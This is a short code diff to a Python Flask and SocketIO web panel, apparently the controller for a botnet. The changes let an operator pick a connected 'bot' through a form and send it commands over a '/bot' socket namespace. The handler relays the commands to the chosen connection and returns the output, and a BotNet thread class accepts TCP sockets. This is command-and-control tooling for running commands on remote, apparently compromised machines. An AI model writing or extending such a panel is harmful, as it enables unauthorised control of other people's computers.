@@ -26,12 +26,16 @@ socketio = SocketIO(app, async_mode=async_mode)
 thread = None
 
 
-@app.route('/')
+@app.route('/', methods=['GET', 'POST'])
 def index():
-    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys())
+    global connected
+    if request.method == 'POST':
+        select = request.form.get('bot')
+        connected = str(select)
+    return render_template('index.html', async_mode=socketio.async_mode, bot_list=allConnections.keys(), connected=connected)
 
 
-@socketio.on('my_event', namespace='/test')
+@socketio.on('my_event', namespace='/bot')
 def test_message(cmd):
     output = allConnections[connected].send(cmd['data'])
     output = json.loads(output)['output']
@@ -45,6 +49,7 @@ def test_message(cmd):
 def bot_selector():
     select = request.form.get('bot')
     connected = str(select)
+    print connected
 
 class BotNet(Thread):
     def __init__(self, tcpsock):
